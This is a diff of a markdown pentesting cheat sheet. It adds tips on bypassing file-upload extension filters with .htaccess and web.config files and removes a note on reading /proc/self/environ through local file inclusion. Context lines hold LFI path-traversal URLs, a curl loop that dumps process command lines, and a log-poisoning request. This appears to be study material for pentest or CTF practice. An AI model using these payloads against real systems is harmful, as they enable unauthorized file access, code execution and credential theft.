@@ -192,6 +192,14 @@ http://domain/page.php?file=data://text/plain;base64,QW9DMyBpcyBmdW4hCg==
 for i in $(seq 0 1000); do curl http://[URL]?page=../../../../proc/${i}/cmdline --output - > ${i}; done
 ```
 
+## FILE UPLOAD
+> Try to avoid file extensions restrictions ( see [hacktricks](https://book.hacktricks.xyz/pentesting-web/file-upload#bypass-file-extensions-checks)  ).
+> Try placing following files to avoid restrictions
+```
+.htaccess       # apache
+web.config      # IIS, can execute code
+```
+
 ## LOG POISONING
 ```http
 GET / HTTP/1.1
@@ -292,9 +300,6 @@ export PATH=/tmp:$PATH
 sudo nano /etc/hosts
 ```
 > add [IPADRESS] [DOMAIN], save and it should work!
-
-## SHELL VIA LFI
-When having LFI try including `www.website.com/view.php?page=../../../../../proc/self/environ`. Now this file can contian ssh passwords or a way to poison to file and execute code.
 
 ## SSH:
 ```bash
